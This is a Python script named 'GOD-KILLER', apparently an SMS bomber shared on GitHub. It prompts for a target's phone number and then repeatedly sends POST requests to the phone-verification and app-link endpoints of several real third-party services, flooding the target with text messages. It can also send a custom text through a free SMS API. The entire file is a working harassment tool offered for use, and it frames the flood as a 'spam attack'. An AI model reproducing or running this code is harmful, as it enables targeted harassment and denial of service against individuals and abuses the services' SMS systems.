
import requests, random

print("""
      #####  ####### ######        #    # ### #       #       ####### ######
     #     # #     # #     #       #   #   #  #       #       #       #     #
     #       #     # #     #       #  #    #  #       #       #       #     #
     #  #### #     # #     # ##### ###     #  #       #       #####   ######
     #     # #     # #     #       #  #    #  #       #       #       #   #
     #     # #     # #     #       #   #   #  #       #       #       #    #
      #####  ####### ######        #    # ### ####### ####### ####### #     #
                     ==================================
                    ||        FROM CaraTortu           ||
                    || github.com/CaraTortu/GOD-KILLER ||
                    ||             Fix for             ||
                    ||  github.com/FDX100/GOD-KILLER   ||
                     ==================================""")

country_code = input('[+] Country code >> ')
phone_number = input('[+] Target phone number >> ')
print('\n    (1) to start spamm atack\n    (2) to start send one msg with custom content\n     ')
choice = input('[+] Your choice >>')

def sms_sender(phone_number, country_code, rn):
    match rn:
        case 1:
            url = 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=TR'
            params = {'phone_number': '' + phone_number + '',
                'country_code': '' + country_code + '',
                'platform': 'web'
            }
            requests.post(url, json=params)
        case 2:
            url = 'https://www.evite.com/ajax/text-me-app-download-link'
            params = {'phone_number': '' + country_code + phone_number + '','referrer': 'textme'}
            requests.post(url, json=params)
        case 3:
            url = 'https://4zxw.app.link/Ua8ZcPeSzn?__branch_flow_type=tmta&__branch_flow_id=689122853173209901'
            phone = country_code + phone_number
            params = {'phone': '' + phone + ''}
            requests.post(url, data=params)



def CustomSms(phone_number, country_code, msg):
    url = 'https://textbelt.com/text'
    params = {'phone': '+' + country_code + phone_number + '',
        'message': '' + msg + '',
        'key': 'textbelt'
    }
    response = requests.post(url, json=params)
    if 'Only' in response.content:
        print('[!] Sorry, today a message was sent to this phone number ' + country_code + phone_number)
    else:
        print('[+] Your message has been sent succesfully')


match choice:
    case '1':
        no = 0
        for i in range(int(input('[+] Messages to send >> '))):
            sms_sender(phone_number, country_code, random.randint(1, 3))
    case '2':
        msg = input('[+] Your custom message >> ')
        CustomSms(phone_number, country_code, msg)

print('\n[+] Sent all messages!')
